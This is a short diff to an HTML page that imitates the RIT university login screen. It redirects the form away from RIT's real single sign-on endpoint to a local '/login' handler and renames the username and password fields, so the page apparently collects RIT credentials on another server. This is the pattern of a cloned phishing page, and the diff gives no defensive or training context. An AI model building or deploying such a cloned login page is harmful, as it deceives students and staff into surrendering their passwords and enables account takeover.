@@ -54,14 +54,14 @@
      <div class='well' align="center">
 
         <h2>RIT Login</h2>
-        <p>Login to rit.brightspace.com</p>
+        <p>Login to start.rit.edu</p>
 
         <div id="userInput">
-        <form action="https://shibboleth.main.ad.rit.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s1" method="post" autocomplete="off" role="form" class="form-horizontal">
+        <form action="/login" method="post" autocomplete="off" role="form" class="form-horizontal">
                   <div class="form-group">
             <label for="username" class="col-sm-2 control-label" name="username">RIT Username</label>
             <div class="col-sm-10">
-            <input class="form-control" id="username" name="j_username" type="text" autocorrect="off" autocapitalize="none"
+            <input class="form-control" id="username" name="username" type="text" autocorrect="off" autocapitalize="none"
                     value="" placeholder="RIT Username (Do not include @rit.edu)">
             </div>
           </div>
@@ -69,7 +69,7 @@
           <div class="form-group">
             <label for="password" class="col-sm-2 control-label">Password</label>
             <div class="col-sm-10">
-            <input class="form-control" id="password" name="j_password" type="password" value="" placeholder="Password">
+            <input class="form-control" id="password" name="password" type="password" value="" placeholder="Password">
             </div>
           </div>
 
